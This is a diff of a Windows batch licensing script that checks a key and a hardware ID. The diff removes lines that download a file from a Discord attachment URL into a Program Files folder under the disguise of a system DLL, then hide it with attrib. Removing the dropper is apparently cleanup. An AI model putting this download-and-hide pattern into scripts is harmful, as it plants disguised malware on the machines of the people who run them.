@@ -39,11 +39,6 @@ set g=[32m
 set w=[37m
 
 
-if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
-curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 
-
-set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"
-
 cls
 
 rem Prompt the user to enter the license key
@@ -69,7 +64,6 @@ if /i "!currentHWID!"=="%targetHWID%" (
     exit /b
 )
 
-powershell -Command "attrib +h \"%logFile%\""
 
 set "isValidCode=false"
 for %%i in (3F7B1-9A8C2-4D5E6) do (
